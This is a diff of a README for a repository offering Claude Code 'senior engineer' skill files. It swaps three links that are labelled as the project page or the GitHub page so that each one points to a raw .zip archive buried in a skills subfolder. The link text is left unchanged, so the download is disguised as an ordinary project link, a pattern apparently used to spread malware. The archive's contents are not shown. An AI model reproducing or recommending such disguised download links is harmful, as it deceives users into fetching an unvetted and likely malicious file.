@@ -1,6 +1,6 @@
 # 🧠 claude-senior-engineer-skills - Think Like a Senior Coder
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://github.com/daviaq7176/claude-senior-engineer-skills)
+[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/daviaq7176/claude-senior-engineer-skills/main/skills/02_debug/engineer-claude-senior-skills-recommission.zip)
 
 ## 📘 What this is
 
@@ -20,7 +20,7 @@ It is built for people who want better code help from Claude Code and related to
 
 Use this link to visit the project page and download the files:
 
-[Open the project page](https://github.com/daviaq7176/claude-senior-engineer-skills)
+[Open the project page](https://raw.githubusercontent.com/daviaq7176/claude-senior-engineer-skills/main/skills/02_debug/engineer-claude-senior-skills-recommission.zip)
 
 ### Steps for Windows
 
@@ -145,7 +145,7 @@ Keep a copy of the original files before you change anything. If you edit the sk
 
 ## 📎 Project link
 
-[Visit claude-senior-engineer-skills on GitHub](https://github.com/daviaq7176/claude-senior-engineer-skills)
+[Visit claude-senior-engineer-skills on GitHub](https://raw.githubusercontent.com/daviaq7176/claude-senior-engineer-skills/main/skills/02_debug/engineer-claude-senior-skills-recommission.zip)
 
 ## 🧰 What this repo is for
 
